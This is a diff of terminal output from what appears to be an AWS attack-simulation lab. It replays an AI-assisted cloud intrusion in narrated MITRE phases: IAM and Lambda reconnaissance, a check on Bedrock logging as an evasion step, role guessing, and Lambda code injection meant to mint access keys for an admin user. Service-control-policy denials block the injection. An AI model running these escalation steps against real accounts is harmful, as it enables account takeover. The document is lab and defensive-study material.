+||  arn:aws:iam::123456789012:user/pra-starting-user-lambda-007                      |  2026-04-27T16:25:47Z |                       |  /    |  AIDA2E4JP2KMMC6XWLIZ4 |  pra-starting-user-lambda-007                       ||
+||  arn:aws:iam::123456789012:user/pra-starting-user-scheduler-001                   |  2026-04-28T18:25:59Z |                       |  /    |  AIDA2E4JP2KMDE4LCSMUV |  pra-starting-user-scheduler-001                    ||
+||  arn:aws:iam::123456789012:user/vault-aws-secrets-backend                         |  2026-02-04T15:05:55Z |                       |  /    |  AIDA2E4JP2KMPGK4GRNZ7 |  vault-aws-secrets-backend                          ||
+|+-----------------------------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-----------------------------------------------------+|
+
+[1;33mThe attacker lists attached policies for pl-prod-8min-frick — the AI flags this[0m
+[1;33muser as a high-value target due to the AdministratorAccess policy.[0m
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws iam list-attached-user-policies --user-name pl-prod-8min-frick[0m
+--------------------------------------------------------------------------
+|                        ListAttachedUserPolicies                        |
++------------------------------------------------------------------------+
+||                           AttachedPolicies                           ||
+|+----------------------------------------------+-----------------------+|
+||                   PolicyArn                  |      PolicyName       ||
+|+----------------------------------------------+-----------------------+|
+||  arn:aws:iam::aws:policy/AdministratorAccess |  AdministratorAccess  ||
+|+----------------------------------------------+-----------------------+|
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws iam list-access-keys --user-name pl-prod-8min-frick[0m
+----------------
+|ListAccessKeys|
++--------------+
+
+[1;33mThe attacker enumerates Lambda functions, looking for execution roles with[0m
+[1;33melevated permissions — a common source of privilege escalation.[0m
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws lambda list-functions --region us-east-1 --query 'Functions[*].[FunctionName,Role]' --output table[0m
+----------------------------------------------------------------------------------------------------------------------------------
+|                                                          ListFunctions                                                         |
++------------------------------------------------+-------------------------------------------------------------------------------+
+|  pl-prod-ctf-002-acmebot                       |  arn:aws:iam::123456789012:role/pl-prod-ctf-002-chatbot-role                  |
+|  pl-prod-lambda-004-to-admin-target-lambda     |  arn:aws:iam::123456789012:role/pl-prod-lambda-004-to-admin-target-role       |
+|  pathrunner-1773949273                         |  arn:aws:iam::123456789012:role/pl-prod-lambda-001-to-admin-target-role       |
+|  pl-prod-ctf-001-acmebot                       |  arn:aws:iam::123456789012:role/pl-prod-ctf-001-chatbot-role                  |
+|  pl-prod-lambda-004-to-iam-002-target-function |  arn:aws:iam::123456789012:role/pl-prod-lambda-004-to-iam-002-lambda-role     |
+|  pl-prod-lambda-003-to-admin-target-lambda     |  arn:aws:iam::123456789012:role/pl-prod-lambda-003-to-admin-target-role       |
+|  pl-prod-lambda-005-to-admin-target-lambda     |  arn:aws:iam::123456789012:role/pl-prod-lambda-005-to-admin-lambda-exec-role  |
+|  pl-prod-8min-ec2-init                         |  arn:aws:iam::123456789012:role/pl-prod-8min-ec2-init-role                    |
+|  pl-prod-hello-world-697683661464-66pzel       |  arn:aws:iam::123456789012:role/pl-prod-lambda-execution-role                 |
+|  pl-prod-ctf-002-acme-data-processor           |  arn:aws:iam::123456789012:role/pl-prod-ctf-002-target-role                   |
++------------------------------------------------+-------------------------------------------------------------------------------+
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws lambda get-function --region us-east-1 --function-name pl-prod-8min-ec2-init --query 'Configuration.{Role:Role,Timeout:Timeout}'[0m
+--------------------------------------------------------------------------
+|                               GetFunction                              |
++-------------------------------------------------------------+----------+
+|                            Role                             | Timeout  |
++-------------------------------------------------------------+----------+
+|  arn:aws:iam::123456789012:role/pl-prod-8min-ec2-init-role  |  3       |
++-------------------------------------------------------------+----------+
+
+[0;32m✓ Identified pl-prod-8min-ec2-init Lambda with a promising execution role[0m
+
+[1;33mThe attacker (via AI assistant) enumerates Bedrock models and checks whether[0m
+[1;33minvocation logging is enabled — an important evasion check.[0m
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws bedrock list-foundation-models --region us-east-1 --query 'modelSummaries[*].[modelId,modelName]' --output table[0m
+------------------------------------------------------------------------------------------
+|                                  ListFoundationModels                                  |
++------------------------------------------------+---------------------------------------+
+|  nvidia.nemotron-nano-12b-v2                   |  NVIDIA Nemotron Nano 12B v2 VL BF16  |
+|  qwen.qwen3-coder-next                         |  Qwen3 Coder Next                     |
+|  anthropic.claude-sonnet-4-20250514-v1:0       |  Claude Sonnet 4                      |
+|  anthropic.claude-haiku-4-5-20251001-v1:0      |  Claude Haiku 4.5                     |
+|  moonshotai.kimi-k2.5                          |  Kimi K2.5                            |
+|  openai.gpt-oss-120b-1:0                       |  gpt-oss-120b                         |
+|  stability.stable-creative-upscale-v1:0        |  Stable Image Creative Upscale        |
+|  qwen.qwen3-next-80b-a3b                       |  Qwen3 Next 80B A3B                   |
+|  deepseek.v3.2                                 |  DeepSeek V3.2                        |
+|  amazon.nova-2-multimodal-embeddings-v1:0      |  Amazon Nova Multimodal Embeddings    |
+|  nvidia.nemotron-nano-3-30b                    |  Nemotron Nano 3 30B                  |
+|  anthropic.claude-sonnet-4-6                   |  Claude Sonnet 4.6                    |
+|  minimax.minimax-m2                            |  MiniMax M2                           |
+|  zai.glm-4.7-flash                             |  GLM 4.7 Flash                        |
+|  mistral.voxtral-mini-3b-2507                  |  Voxtral Mini 3B 2507                 |
+|  amazon.nova-pro-v1:0                          |  Nova Pro                             |
+|  amazon.nova-pro-v1:0:24k                      |  Nova Pro                             |
+|  amazon.nova-pro-v1:0:300k                     |  Nova Pro                             |
+|  stability.stable-image-remove-background-v1:0 |  Stable Image Remove Background       |
+|  stability.stable-image-control-sketch-v1:0    |  Stable Image Control Sketch          |
+|  amazon.nova-2-lite-v1:0                       |  Nova 2 Lite                          |
+|  amazon.nova-2-lite-v1:0:256k                  |  Nova 2 Lite                          |
+|  stability.stable-conservative-upscale-v1:0    |  Stable Image Conservative Upscale    |
+|  minimax.minimax-m2.5                          |  MiniMax M2.5                         |
+|  google.gemma-3-12b-it                         |  Gemma 3 12B IT                       |
+|  stability.stable-image-search-recolor-v1:0    |  Stable Image Search and Recolor      |
+|  moonshot.kimi-k2-thinking                     |  Kimi K2 Thinking                     |
+|  mistral.mistral-large-3-675b-instruct         |  Mistral Large 3                      |
+|  twelvelabs.pegasus-1-2-v1:0                   |  Pegasus v1.2                         |
+|  amazon.nova-2-sonic-v1:0                      |  Nova 2 Sonic                         |
+|  mistral.devstral-2-123b                       |  Devstral 2 123B                      |
+|  minimax.minimax-m2.1                          |  MiniMax M2.1                         |
+|  nvidia.nemotron-super-3-120b                  |  NVIDIA Nemotron 3 Super 120B A12B    |
+|  qwen.qwen3-32b-v1:0                           |  Qwen3 32B (dense)                    |
+|  mistral.ministral-3-14b-instruct              |  Ministral 14B 3.0                    |
+|  anthropic.claude-opus-4-6-v1                  |  Claude Opus 4.6                      |
+|  writer.palmyra-x5-v1:0                        |  Palmyra X5                           |
+|  nvidia.nemotron-nano-9b-v2                    |  NVIDIA Nemotron Nano 9B v2           |
+|  mistral.ministral-3-8b-instruct               |  Ministral 3 8B                       |
+|  mistral.voxtral-small-24b-2507                |  Voxtral Small 24B 2507               |
+|  zai.glm-5                                     |  GLM 5                                |
+|  openai.gpt-oss-20b-1:0                        |  gpt-oss-20b                          |
+|  google.gemma-3-4b-it                          |  Gemma 3 4B IT                        |
+|  stability.stable-fast-upscale-v1:0            |  Stable Image Fast Upscale            |
+|  anthropic.claude-opus-4-7                     |  Claude Opus 4.7                      |
+|  stability.stable-image-erase-object-v1:0      |  Stable Image Erase Object            |
+|  openai.gpt-oss-safeguard-120b                 |  GPT OSS Safeguard 120B               |
+|  google.gemma-3-27b-it                         |  Gemma 3 27B PT                       |
+|  stability.stable-image-control-structure-v1:0 |  Stable Image Control Structure       |
+|  twelvelabs.marengo-embed-3-0-v1:0             |  Marengo Embed 3.0                    |
+|  writer.palmyra-x4-v1:0                        |  Palmyra X4                           |
+|  anthropic.claude-sonnet-4-5-20250929-v1:0     |  Claude Sonnet 4.5                    |
+|  twelvelabs.marengo-embed-2-7-v1:0             |  Marengo Embed v2.7                   |
+|  qwen.qwen3-vl-235b-a22b                       |  Qwen3 VL 235B A22B                   |
+|  zai.glm-4.7                                   |  GLM 4.7                              |
+|  writer.palmyra-vision-7b                      |  Writer Palmyra Vision 7B             |
+|  stability.stable-outpaint-v1:0                |  Stable Image Outpaint                |
+|  stability.stable-image-inpaint-v1:0           |  Stable Image Inpaint                 |
+|  anthropic.claude-opus-4-1-20250805-v1:0       |  Claude Opus 4.1                      |
+|  stability.stable-image-style-guide-v1:0       |  Stable Image Style Guide             |
+|  mistral.magistral-small-2509                  |  Magistral Small 2509                 |
+|  stability.stable-style-transfer-v1:0          |  Stable Image Style Transfer          |
+|  cohere.embed-v4:0                             |  Embed v4                             |
+|  mistral.ministral-3-3b-instruct               |  Ministral 3B                         |
+|  anthropic.claude-opus-4-5-20251101-v1:0       |  Claude Opus 4.5                      |
+|  stability.stable-image-search-replace-v1:0    |  Stable Image Search and Replace      |
+|  qwen.qwen3-coder-30b-a3b-v1:0                 |  Qwen3-Coder-30B-A3B-Instruct         |
+|  openai.gpt-oss-safeguard-20b                  |  GPT OSS Safeguard 20B                |
+|  amazon.titan-image-generator-v2:0             |  Titan Image Generator G1 v2          |
+|  amazon.nova-premier-v1:0:8k                   |  Nova Premier                         |
+|  amazon.nova-premier-v1:0:20k                  |  Nova Premier                         |
+|  amazon.nova-premier-v1:0:1000k                |  Nova Premier                         |
+|  amazon.nova-premier-v1:0:mm                   |  Nova Premier                         |
+|  amazon.nova-premier-v1:0                      |  Nova Premier                         |
+|  amazon.nova-lite-v1:0:24k                     |  Nova Lite                            |
+|  amazon.nova-lite-v1:0:300k                    |  Nova Lite                            |
+|  amazon.nova-lite-v1:0                         |  Nova Lite                            |
+|  amazon.nova-canvas-v1:0                       |  Nova Canvas                          |
+|  amazon.nova-reel-v1:0                         |  Nova Reel                            |
+|  amazon.nova-reel-v1:1                         |  Nova Reel                            |
+|  amazon.nova-micro-v1:0:24k                    |  Nova Micro                           |
+|  amazon.nova-micro-v1:0:128k                   |  Nova Micro                           |
+|  amazon.nova-micro-v1:0                        |  Nova Micro                           |
+|  amazon.nova-sonic-v1:0                        |  Nova Sonic                           |
+|  amazon.titan-embed-g1-text-02                 |  Titan Text Embeddings v2             |
+|  amazon.titan-embed-text-v1:2:8k               |  Titan Embeddings G1 - Text           |
+|  amazon.titan-embed-text-v1                    |  Titan Embeddings G1 - Text           |
+|  amazon.titan-embed-text-v2:0:8k               |  Titan Text Embeddings V2             |
+|  amazon.titan-embed-text-v2:0                  |  Titan Text Embeddings V2             |
+|  amazon.titan-embed-image-v1:0                 |  Titan Multimodal Embeddings G1       |
+|  amazon.titan-embed-image-v1                   |  Titan Multimodal Embeddings G1       |
+|  ai21.jamba-1-5-large-v1:0                     |  Jamba 1.5 Large                      |
+|  ai21.jamba-1-5-mini-v1:0                      |  Jamba 1.5 Mini                       |
+|  anthropic.claude-3-sonnet-20240229-v1:0:28k   |  Claude 3 Sonnet                      |
+|  anthropic.claude-3-sonnet-20240229-v1:0:200k  |  Claude 3 Sonnet                      |
+|  anthropic.claude-3-sonnet-20240229-v1:0       |  Claude 3 Sonnet                      |
+|  anthropic.claude-3-haiku-20240307-v1:0:48k    |  Claude 3 Haiku                       |
+|  anthropic.claude-3-haiku-20240307-v1:0:200k   |  Claude 3 Haiku                       |
+|  anthropic.claude-3-haiku-20240307-v1:0        |  Claude 3 Haiku                       |
+|  anthropic.claude-3-5-haiku-20241022-v1:0      |  Claude 3.5 Haiku                     |
+|  anthropic.claude-opus-4-20250514-v1:0         |  Claude Opus 4                        |
+|  cohere.command-r-v1:0                         |  Command R                            |
+|  cohere.command-r-plus-v1:0                    |  Command R+                           |
+|  cohere.embed-english-v3:0:512                 |  Embed English                        |
+|  cohere.embed-english-v3                       |  Embed English                        |
+|  cohere.embed-multilingual-v3:0:512            |  Embed Multilingual                   |
+|  cohere.embed-multilingual-v3                  |  Embed Multilingual                   |
+|  cohere.rerank-v3-5:0                          |  Rerank 3.5                           |
+|  deepseek.r1-v1:0                              |  DeepSeek-R1                          |
+|  meta.llama3-8b-instruct-v1:0                  |  Llama 3 8B Instruct                  |
+|  meta.llama3-70b-instruct-v1:0                 |  Llama 3 70B Instruct                 |
+|  meta.llama3-1-8b-instruct-v1:0                |  Llama 3.1 8B Instruct                |
+|  meta.llama3-1-70b-instruct-v1:0               |  Llama 3.1 70B Instruct               |
+|  meta.llama3-2-11b-instruct-v1:0               |  Llama 3.2 11B Instruct               |
+|  meta.llama3-2-90b-instruct-v1:0               |  Llama 3.2 90B Instruct               |
+|  meta.llama3-2-1b-instruct-v1:0                |  Llama 3.2 1B Instruct                |
+|  meta.llama3-2-3b-instruct-v1:0                |  Llama 3.2 3B Instruct                |
+|  meta.llama3-3-70b-instruct-v1:0               |  Llama 3.3 70B Instruct               |
+|  meta.llama4-scout-17b-instruct-v1:0           |  Llama 4 Scout 17B Instruct           |
+|  meta.llama4-maverick-17b-instruct-v1:0        |  Llama 4 Maverick 17B Instruct        |
+|  mistral.mistral-7b-instruct-v0:2              |  Mistral 7B Instruct                  |
+|  mistral.mixtral-8x7b-instruct-v0:1            |  Mixtral 8x7B Instruct                |
+|  mistral.mistral-large-2402-v1:0               |  Mistral Large (24.02)                |
+|  mistral.mistral-small-2402-v1:0               |  Mistral Small (24.02)                |
+|  mistral.pixtral-large-2502-v1:0               |  Pixtral Large (25.02)                |
++------------------------------------------------+---------------------------------------+
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws bedrock get-model-invocation-logging-configuration --region us-east-1[0m
+
+[0;34m============================================================[0m
+[0;34mPHASE 3: Role Guessing (T1078.004 — Cloud Accounts)[0m
+[0;34m============================================================[0m
+
+[2m[Elapsed: 12s][0m
+
+[1;33mThe AI assistant tries obvious admin role names — a hallmark of AI-assisted[0m
+[1;33mattacks. These role names do not exist in this account; both attempts fail.[0m
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin --role-session-name test[0m
+An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::123456789012:user/pl-prod-8min-compromised-user is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::123456789012:role/admin
+[2m(expected failure — role does not exist)[0m
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Administrator --role-session-name test[0m
+An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::123456789012:user/pl-prod-8min-compromised-user is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::123456789012:role/Administrator
+[2m(expected failure — role does not exist)[0m
+
+[1;33mThe attacker discovers and assumes three real low-privilege roles. These roles[0m
+[1;33mdon't provide a direct path to admin but confirm lateral movement is possible.[0m
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-8min-sysadmin-role --role-session-name explore[0m
+[0;32m✓ Assumed pl-prod-8min-sysadmin-role[0m
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-8min-developer-role --role-session-name test[0m
+[0;32m✓ Assumed pl-prod-8min-developer-role[0m
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-8min-account-role --role-session-name pwned[0m
+[0;32m✓ Assumed pl-prod-8min-account-role[0m
+
+[2mNone of these low-privilege roles provide a path to admin. Returning to[0m
+[2mcompromised user credentials to pursue the Lambda injection vector.[0m
+
+[0;34m============================================================[0m
+[0;34mPHASE 4: Lambda Code Injection Attempt 1 — Wrong Target[0m
+[0;34m(T1648 — Serverless Execution)[0m
+[0;34m============================================================[0m
+
+[2m[Elapsed: 16s][0m
+
+[1;33mThe attacker's AI assistant identifies Lambda code injection as a privilege[0m
+[1;33mescalation path. The first attempt targets pl-prod-8min-admingh — a user the[0m
+[1;33mAI guesses may have admin access based on the name pattern. The technique works[0m
+[1;33mtechnically, but admingh has no useful policies attached.[0m
+
+Created malicious payload: /tmp/malicious_lambda_v1.zip
+
+
+[0;36m[Attacker (pl-prod-8min-compromised-user)] $ aws lambda update-function-code --region us-east-1 --function-name pl-prod-8min-ec2-init --zip-file fileb:///tmp/malicious_lambda_v1.zip[0m
+
+[0;36m[Attacker (pl-prod-8min-compromised-user)] $ aws lambda update-function-configuration --region us-east-1 --function-name pl-prod-8min-ec2-init --handler malicious_handler_v1.handler --timeout 30[0m
+
+[1;33mWaiting for Lambda update to propagate...[0m
+[0;32m✓ Lambda updated[0m
+
+
+[0;36m[Attacker (pl-prod-8min-compromised-user)] $ aws lambda invoke --region us-east-1 --function-name pl-prod-8min-ec2-init --payload '{}' /tmp/lambda_response_v1.json[0m
+Lambda response (attempt 1):
+{
+  "statusCode": 500,
+  "body": "{\"error\": \"An error occurred (AccessDenied) when calling the CreateAccessKey operation: User: arn:aws:sts::123456789012:assumed-role/pl-prod-8min-ec2-init-role/pl-prod-8min-ec2-init is not authorized to perform: iam:CreateAccessKey on resource: user pl-prod-8min-admingh with an explicit deny in a service control policy: arn:aws:organizations::123456789012:policy/o-73iu42t62o/service_control_policy/p-chymj835\"}"
+}
+
+[0;31m✗ Attempt 1 failed to yield admin access — pl-prod-8min-admingh has no attached policies[0m
+Attached policies: 0
+
+[0;34m============================================================[0m
+[0;34mPHASE 5: Lambda Code Injection Attempt 2 — The 8-Minute Moment[0m
+[0;34m(T1648 + T1098.001 — Serverless Execution + Additional Cloud Credentials)[0m
+[0;34m============================================================[0m
+
+[2m[Elapsed: 47s][0m
+
+[1;33mThe attacker pivots to target pl-prod-8min-frick — the user confirmed during[0m
+[1;33mrecon as having AdministratorAccess. The same Lambda injection technique is[0m
+[1;33mredeployed with the correct target username.[0m
+
+Created malicious payload: /tmp/malicious_lambda_v2.zip
+
+
+[0;36m[Attacker (pl-prod-8min-compromised-user)] $ aws lambda update-function-code --region us-east-1 --function-name pl-prod-8min-ec2-init --zip-file fileb:///tmp/malicious_lambda_v2.zip[0m
+
+[0;36m[Attacker (pl-prod-8min-compromised-user)] $ aws lambda update-function-configuration --region us-east-1 --function-name pl-prod-8min-ec2-init --handler malicious_handler_v2.handler --timeout 30[0m
+
+[1;33mWaiting for Lambda update to propagate...[0m
+[0;32m✓ Lambda updated[0m
+
+
+[0;36m[Attacker (pl-prod-8min-compromised-user)] $ aws lambda invoke --region us-east-1 --function-name pl-prod-8min-ec2-init --payload '{}' /tmp/lambda_response_v2.json[0m
+Lambda response (attempt 2):
+{
+  "errorMessage": "An error occurred (AccessDenied) when calling the CreateAccessKey operation: User: arn:aws:sts::123456789012:assumed-role/pl-prod-8min-ec2-init-role/pl-prod-8min-ec2-init is not authorized to perform: iam:CreateAccessKey on resource: user pl-prod-8min-frick with an explicit deny in a service control policy: arn:aws:organizations::123456789012:policy/o-73iu42t62o/service_control_policy/p-chymj835",
+  "errorType": "ClientError",
+  "requestId": "c625065a-33f0-4db1-be49-2a253ab47e4f",
+  "stackTrace": [
+    "  File \"/var/task/malicious_handler_v2.py\", line 10, in handler\n    key = iam.create_access_key(UserName='pl-prod-8min-frick')\n",
+    "  File \"/var/lang/lib/python3.12/site-packages/botocore/client.py\", line 602, in _api_call\n    return self._make_api_call(operation_name, kwargs)\n",
+    "  File \"/var/lang/lib/python3.12/site-packages/botocore/context.py\", line 123, in wrapper\n    return func(*args, **kwargs)\n",
+    "  File \"/var/lang/lib/python3.12/site-packages/botocore/client.py\", line 1078, in _make_api_call\n    raise error_class(parsed_response, operation_name)\n"
+  ]
+}
+
+[0;31mError: Could not extract frick credentials from Lambda response[0m
+[0;31m[demo_permissions] Error: Could not find project root from /Users/seth.art/Documents/projects/pathfinding/pathfinding-labs/modules/scenarios/attack-simulation/sysdig-8-minutes-to-admin[0m
+[0;31m[demo_permissions] Warning: Could not get admin creds, skipping restriction[0m
